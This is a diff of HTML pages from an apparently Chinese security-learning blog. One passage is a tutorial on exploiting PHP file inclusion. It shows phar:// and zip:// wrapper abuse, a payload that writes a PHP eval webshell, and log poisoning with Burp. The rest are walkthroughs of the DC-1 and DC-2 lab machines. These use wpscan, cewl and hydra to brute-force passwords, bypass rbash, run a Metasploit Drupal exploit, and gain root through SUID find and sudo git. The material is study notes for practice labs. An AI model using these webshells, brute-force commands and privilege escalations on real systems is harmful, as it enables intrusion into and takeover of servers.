+<p><img src="9272355-c833b1fd110b6170%5B1%5D.png" alt=""></p>
+<p><img src="9272355-5304d206d0b1fcc8%5B1%5D.png" alt=""></p>
+<p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p>
+<p>加上cookie之后在重新连接，成功连接</p>
+<p><img src="9272355-44a9d0f1054d26b9%5B1%5D.png" alt=""></p>
+<h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul>
+<li><p>利用条件：php版本大于等于php5.3.0</p>
+</li>
+<li><p>这个参数就是php解压缩包的一个函数，不管后缀是什么，都会被当做压缩包来解压。</p>
+<p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php </p>
+<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p>
+</li>
+<li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p>
+</li>
+</ul>
+<p><img src="9272355-041eece378dca1e4.png" alt=""></p>
+<p>指定绝对路径：</p>
+<pre><code>index2.php?file=phar://C:\phpStudy\WWW\FileInclusion\phpinfo.zip\phpinfo.txt</code></pre><p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
+<pre><code>index2.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="9272355-489da319d283d845.png" alt=""></p>
+<h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul>
+<li><p>php版本大于等于php5.3.0</p>
+</li>
+<li><p>zip伪协议和phar协议类似，但是用法不一样。</p>
+</li>
+<li><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</p>
+</li>
+<li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+</li>
+</ul>
+<pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h4 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h4><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：</p>
+<pre><code>&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[tzc]);?&gt;&quot;)?&gt;</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
+<ul>
+<li>1.日志的物理存放路径</li>
+<li>2.存在文件包含漏洞</li>
+</ul>
+<p>获取日志存放路径</p>
+<p>（一）日志默认路径</p>
+<p>(1) apache+Linux日志默认路径</p>
+<pre class=" language-undefined"><code class="language-undefined">    /etc/httpd/logs/access_log</code></pre>
+<p>或者</p>
+<pre class=" language-bash"><code class="language-bash">    /var/log/httpd/access_log</code></pre>
+<p>(2) apache+win2003日志默认路径</p>
+<pre class=" language-cpp"><code class="language-cpp">    D<span class="token operator">:</span>\xampp\apache\logs\access<span class="token punctuation">.</span>log
+    D<span class="token operator">:</span>\xampp\apache\logs\error<span class="token punctuation">.</span>log</code></pre>
+<p>(3) IIS6.0+win2003默认日志文件</p>
+<pre class=" language-undefined"><code class="language-undefined">    C:\WINDOWS\system32\Logfiles</code></pre>
+<p>(4) IIS7.0+win2003 默认日志文件</p>
+<pre class=" language-undefined"><code class="language-undefined">    %SystemDrive%\inetpub\logs\LogFiles</code></pre>
+<p>(5) nginx 日志文件</p>
+<pre class=" language-bash"><code class="language-bash">    日志文件在用户安装目录logs目录下
+            以我的安装路径为例/usr/local/nginx,
+            那我的日志目录就是在/usr/local/nginx/logs里</code></pre>
+<p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p>
+<pre class=" language-xml"><code class="language-xml"> http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="token prolog">&lt;?php @eval($_POST[c]);?></span></code></pre>
+<p><img src="9272355-f9f0db6a9d7ff53a%5B1%5D.png" alt=""></p>
+<p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p>
+<p><img src="9272355-738380f7e8b09e46%5B1%5D.png" alt=""></p>
+<p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p>
+<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span><span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
+<pre class=" language-rust"><code class="language-rust">               <span class="token string">"&lt;"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 大于号被转码为了 <span class="token operator">%</span>3C
+                <span class="token string">">"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 小于号被转码为了 <span class="token operator">%</span>3E
+                <span class="token string">" "</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 空格被转码为了 <span class="token operator">%</span><span class="token number">20</span></code></pre>
+<p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p>
+<p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
+<p><img src="9272355-ff2a0beae4cc4468%5B1%5D.png" alt=""></p>
+<p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p>
+<p><img src="9272355-f5d368a6f62b9802%5B1%5D.png" alt=""></p>
+<p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p>
+<p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p>
+<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
+<p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p>
+<p><img src="9272355-e094a1b3f7e98f45%5B1%5D.png" alt=""></p>
+<p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p>
+<pre class=" language-cpp"><code class="language-cpp">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">81</span><span class="token operator">/</span>FileInclusion<span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>C<span class="token operator">:</span><span class="token operator">/</span>phpStudy<span class="token operator">/</span>Apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span>log</code></pre>
+<p>客户端连接，获取一句话木马</p>
+<h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p>
+<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
+<p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p>
+<h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p>
+<h4 id="jsp文件包含漏洞"><a href="#jsp文件包含漏洞" class="headerlink" title="jsp文件包含漏洞"></a>jsp文件包含漏洞</h4><p>include</p>
+<pre><code>&lt;%@ include file=&quot;head.jsp&quot;%&gt;
+&lt;%@ include file=&quot;body.jsp&quot;%&gt;
+&lt;%@ include file=&quot;tail.jsp&quot;%&gt;</code></pre><p>jsp:include</p>
+<pre><code>&lt;jsp:include page=&quot;head.jsp&quot;/&gt;
+&lt;jsp:include page=&quot;body.jsp&quot;/&gt;   
+&lt;jsp:include page=&quot;tail.jsp”/&gt;</code></pre><p>采用JSTL</p>
+<pre><code>&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</code></pre><h4 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h4><p>asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：</p>
+<pre><code>    &lt;!--#include file=&quot;1.asp&quot; --&gt;</code></pre><h4 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h4><p>aspx文件包含与asp一样，语法如下：</p>
+<pre><code>    &lt;!--#include file=&quot;top.aspx&quot; --&gt;</code></pre><hr>
+<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p>
+<p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
+<p><a href="https://blog.csdn.net/God_XiangYu/article/details/97335988#asp文件包含漏洞" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/97335988#asp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E</a></p>
+<p><a href="https://thief.one/2017/04/10/2/" target="_blank" rel="noopener">https://thief.one/2017/04/10/2/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/dc-2-ba-ji-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/dc-2-ba-ji-xue-xi/" itemprop="url">DC-2靶机学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T11:05:39+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="DC-2靶机测试"><a href="#DC-2靶机测试" class="headerlink" title="DC-2靶机测试"></a>DC-2靶机测试</h2><p>[TOC]</p>
+<h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205133827.png" alt=""></p>
+<p>我们使用netdiscover进行主机发现。</p>
+<pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205102253.png" alt=""></p>
+<p>确定了靶机IP为192.168.153.136</p>
+<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用nmap 进行信息收集</p>
+<pre><code>nmap -A -p 1-65535 192.168.153.136 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111215.png" alt=""></p>
+<p>我们发现靶机上开放着80端口，并且部署了apache服务器，7744开启了SSH服务。提示是一个wordpress站点</p>
+<p>我们需要首先在host文件下添加<a href="http://dc-2/域名，然后使用浏览器去访问该域名。" target="_blank" rel="noopener">http://dc-2/域名，然后使用浏览器去访问该域名。</a></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205111308.png" alt=""></p>
+<p>我们使用Wappalyzer进行指纹识别。确定了是一个WordPress的站点。</p>
+<h4 id="第三步、使用Wpscan扫描"><a href="#第三步、使用Wpscan扫描" class="headerlink" title="第三步、使用Wpscan扫描"></a>第三步、使用Wpscan扫描</h4><p>​       该扫描器可以实现获取<code>Wordpress</code>站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p>
+<p>我们使用命令扫描网站内的用户名</p>
+<pre><code>wpscan --url dc-2 -e u</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132051.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132034.png" alt=""></p>
+<p>获取到用户名后，我们思考能否爆破密码。</p>
+<p>我们首先使用crel收集网页的信息</p>
+<p>​    Cewl：CeWL是一款以爬虫模式在指定URL上收集单词的工具，可以将它收集到的单词纳入密码字典，以提高密码破解工具的成功率。</p>
+<pre><code>cewl dc-2 -w dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111938.png" alt=""></p>
+<p>得到密码字典后我们继续回到wpscan进行密码爆破、</p>
+<pre><code>wpscan --url dc-2 -P dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132515.png" alt=""></p>
+<p>我们得到了两个登录的账号和密码。</p>
+<h4 id="第四步、登录后台"><a href="#第四步、登录后台" class="headerlink" title="第四步、登录后台"></a>第四步、登录后台</h4><p>我们通过wpscan发现了默认的后台登录页面。（wp-login.php)</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132755.png" alt=""></p>
+<p>我们使用jerry用户进行登录。在其账号中发现了flag2.txt的信息。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132930.png" alt=""></p>
+<p>我们翻译一下：</p>
+<p>如果你不能利用WordPress并抄近路，还有别的办法。           </p>
+<p>   希望你能找到另一个切入点。</p>
+<h4 id="第五步、登录ssh"><a href="#第五步、登录ssh" class="headerlink" title="第五步、登录ssh"></a>第五步、登录ssh</h4><pre><code> 我们尝试使用上面两个账户来登陆ssh。首先尝试tom的账户。</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200217113658.png" alt=""></p>
+<p>可以登陆，ls一下可以看到flag3。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200217113757.png" alt=""></p>
+<p>​    但是登陆使用的shell是rBash，功能受到严重限制以至于cat命令都无法使用，所以需要想办法绕过限制。我们先尝试把shell切换为/bin/sh，成功了。继续尝试使用cat来查看flag3中的内容，提示不能找到命令，这时候原因应该是没有将cat命令的目录添加到$PATH中，于是添加之。然后使用cat查看flag3.txt中的内容。<br>rBash和sh shell命令</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205115512.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205115956.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120014.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120104.png" alt=""></p>
+<h4 id="第六步、Git提权获得最终flag"><a href="#第六步、Git提权获得最终flag" class="headerlink" title="第六步、Git提权获得最终flag"></a>第六步、Git提权获得最终flag</h4><p>我们先切换到jerry用户，在jerry的家目录下找到flag4.txt</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120330.png" alt=""></p>
+<p>flag4 提示我们可以使用git，我们可以通过git来提权</p>
+<p>sudo -l 我们可以看到无需root权限，jerry 可以使用 git ！</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123533.png" alt=""></p>
+<p>我们可以利用suid 进行提权</p>
+<p>SUID可以让调用者以文件拥有者的身份运行该文件</p>
+<pre><code>sudo git -p --help</code></pre><p>输入!/bin/bash 获得root权限</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123719.png" alt=""></p>
+<p>我们在root目录下找到最后一个flag。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123829.png" alt=""></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/dc-1-ba-ji-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/dc-1-ba-ji-xue-xi/" itemprop="url">DC-1靶机学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T11:05:19+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="DC-1靶机学习"><a href="#DC-1靶机学习" class="headerlink" title="DC-1靶机学习"></a>DC-1靶机学习</h2><h4 id="第一步、搭建dc-1和kali虚拟机，使用-nat模式"><a href="#第一步、搭建dc-1和kali虚拟机，使用-nat模式" class="headerlink" title="第一步、搭建dc-1和kali虚拟机，使用.nat模式"></a>第一步、搭建dc-1和kali虚拟机，使用.nat模式</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200204102843.png" alt=""></p>
+<p>我们进入DC-1的登录界面，然后回到kali攻击机准备入侵。</p>
+<h4 id="第二步、扫描出靶机的ip地址"><a href="#第二步、扫描出靶机的ip地址" class="headerlink" title="第二步、扫描出靶机的ip地址"></a>第二步、扫描出靶机的ip地址</h4><p>1.我们可以使用nmap进行二层的主机发现</p>
+<p><code>nmap -sn 192.168.153.0/24</code></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204103154.png" alt=""></p>
+<p>2.使用netdiscover进行主机发现</p>
+<p><code>netdiscover -i eth0 -r 192.168.153.0/24</code></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204114216.png" alt=""></p>
+<p>3.使用arp-scan进行主机发现</p>
+<p><code>arp-scan -l</code></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204114720.png" alt=""></p>
+<h4 id="第三步、靶机的信息收集"><a href="#第三步、靶机的信息收集" class="headerlink" title="第三步、靶机的信息收集"></a>第三步、靶机的信息收集</h4><p>我们使用nmap对该靶机进行扫描。</p>
+<pre><code>nmap -A -p 1-65535 192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204103823.png" alt=""></p>
+<p>我们发现开放的80(tcp) 22（ssh) 111(tcp)端口，并且可以看出使用的CMS为Drupal7。</p>
+<p>我们从浏览器访问该IP的80页面</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104045.png" alt=""></p>
+<p>我们使用Wappalyzer进行网站的指纹识别，得到更详细的信息。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204115356.png" alt=""></p>
+<h4 id="第四步、使用msf入侵目标系统"><a href="#第四步、使用msf入侵目标系统" class="headerlink" title="第四步、使用msf入侵目标系统"></a>第四步、使用msf入侵目标系统</h4><p>进入msf控制台，使用search命令查找关于Drupal的历史漏洞。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104359.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104445.png" alt=""></p>
+<p>我们选择极好等级的并且日期较近的漏洞进行利用，可以提高成功概率。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104853.png" alt=""></p>
+<p>我们使用set命令设置目标机器，使用run或exploit命令开始攻击。</p>
+<p>看到出现meterpreter证明成功入侵系统。</p>
+<h4 id="第五步、获取flag-1"><a href="#第五步、获取flag-1" class="headerlink" title="第五步、获取flag 1"></a>第五步、获取flag 1</h4><p>我们执行shell命令获得shell.</p>
+<p>ls后发现目录下存在flag1.txt.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204105001.png" alt=""></p>
+<p>我们cat flag1.txt读取内容。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204105042.png" alt=""></p>
+<p>翻译：每一个好的CMS都需要一个配置文件，你也一样。</p>
+<h4 id="第六步、获取flag2-txt"><a href="#第六步、获取flag2-txt" class="headerlink" title="第六步、获取flag2.txt"></a>第六步、获取flag2.txt</h4><p>我们通过百度查询到该cms的配置文件 ：/var/www/sites/default</p>
+<p>我们使用cd命令切换到该目录，读取目录下的setting.php文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110426.png" alt=""></p>
+<p>我们找到了flag2.txt并读取内容。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110442.png" alt=""></p>
+<p>翻译：暴力和字典攻击不是获取访问权限的唯一方式。并且将需要访问权限。并且给出了mysql数据库的账号和密码。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110617.png" alt=""></p>
+<h4 id="第七步、获取flag4-txt"><a href="#第七步、获取flag4-txt" class="headerlink" title="第七步、获取flag4.txt"></a>第七步、获取flag4.txt</h4><p>我们可以先看一下/etc/passwd中的内容，意外发现了flag4的账号名</p>
+<p>/etc/passwd 储存了用户重要信息，一般可读但不可写</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204115756.png" alt=""></p>
+<p>我们尝试使用john+hydra进行暴力破解。</p>
+<pre><code>hydra -l flag4 -p/Users/john-1.8.0/run/password.lst ssh://192.168.153.150</code></pre><p>-l 指定用户名<br> -P 加载密码字典（这里使用了John the Ripper安装后提供的密码本，一般在john-1.8.0/run/password.lst)<br> ssh://ip 指定使用协议和ip地址</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204120356.png" alt=""></p>
+<p>得到了flag4账号对应的密码为orange</p>
+<p>我们使用kali ssh远程登录 </p>
+<pre><code>ssh flag4@192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204120529.png" alt=""></p>
+<p>ls后发现flag4.txt文件，尝试cat读取。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204121509.png" alt=""></p>
+<p>翻译:您可以使用相同的方法在根目录中查找或访问标志吗?可能。但也许不是那么容易。或许是这样？</p>
+<p>可能我们需要提权。</p>
+<h4 id="第八步、获得-thefinalflag-txt"><a href="#第八步、获得-thefinalflag-txt" class="headerlink" title="第八步、获得 thefinalflag.txt"></a>第八步、获得 thefinalflag.txt</h4><p>由flag3.txt可知，我们需要获取root权限才能读取最终的flag</p>
+<p>由于对提取部分知识不够，参考别人的教程要利用suid提权</p>
+<p>suid是Linux的一个权限机制，在执行使用suid权限的文件时候，调用者会暂时有该文件的root权限。</p>
+<p>首先我们使用<code>find / -perm -4000 2&gt;/dev/null</code>发现系统上运行的所有SUID可执行文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204122116.png" alt=""></p>
+<p>发现find命令被设置为suid权限位</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200204122420.png" alt=""></p>
+<p>之后我们通过find命令提权，使用whoami查看用户权限。</p>
+<p>之后进入 root目录下查看最终的flag.</p>
+<p><strong>完</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1710,1586 +2883,6 @@ echo '<?php @eval($_POST[margin]);?>' > shell.php</code></pre>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
